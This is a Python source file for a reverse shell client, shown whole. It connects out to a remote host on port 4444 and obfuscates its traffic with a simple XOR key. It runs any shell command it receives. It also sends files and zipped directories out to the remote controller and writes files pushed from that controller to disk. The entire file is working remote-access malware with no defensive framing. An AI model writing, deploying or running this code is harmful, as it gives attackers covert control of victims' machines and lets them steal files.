import socket
import os
import subprocess
import shutil

host = "ip"
port = 4444

s = socket.socket()
s.connect((host,port))
s.settimeout(5)

def xor(data, key="sudoxs"):
    return bytes([b ^ ord(key[i % len(key)]) for i, b in enumerate(data)])

done_marker = xor(b"DONE")

while True:
    try:
        data = s.recv(1024)
    except socket.timeout:
        continue
    command = xor(data).decode().strip()

    if command == "exit":
        break
    elif command.startswith("download "):
        filename = command.split(" ",1)[1]

        if os.path.isdir(filename):
            shutil.make_archive(f"/tmp/{filename}", "zip", filename)
            filename = f"/tmp/{filename}.zip"
        
        if os.path.exists(filename):
            with open(filename,"rb") as f:
                while True:
                    data = f.read(1024)
                    if not data:
                        break
                    encrypted = xor(data)
                    s.send(encrypted)
                s.send(xor(b"DONE"))
        else:
            s.send(xor(b"[-] file not found" + done_marker))

    elif command.startswith("upload "):
        filename = command.split(" ",1)[1]
        with open(filename,"wb") as f:
            while True:
                try:
                    data = s.recv(1024)
                except socket.timeout:
                    continue
                decrypted = xor(data)
                if decrypted.endswith(done_marker):
                    f.write(decrypted[:-len(done_marker)])
                    break
                f.write(decrypted)
    else:
        output = subprocess.getoutput(command)
        s.send(output.encode())

s.shutdown(socket.SHUT_RDWR)
s.close()
       

